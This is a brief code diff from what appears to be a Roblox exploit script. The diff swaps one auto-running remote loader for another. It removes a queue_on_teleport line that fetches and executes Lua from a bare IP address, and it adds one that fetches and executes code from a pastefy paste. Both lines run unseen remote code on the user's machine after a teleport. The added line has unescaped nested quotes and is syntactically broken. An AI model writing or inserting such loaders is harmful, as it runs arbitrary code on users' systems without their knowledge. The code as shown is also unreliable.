@@ -114,5 +114,4 @@ Tab:CreateButton({
     end
 })
 
-queue_on_teleport([[ID="ddd35a81-82a0-4ae2-a81b-33811bb3f7ef";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()]])
+queue_on_teleport("loadstring(game:HttpGet("https://pastefy.app/pg2sgGIu/raw"))()")
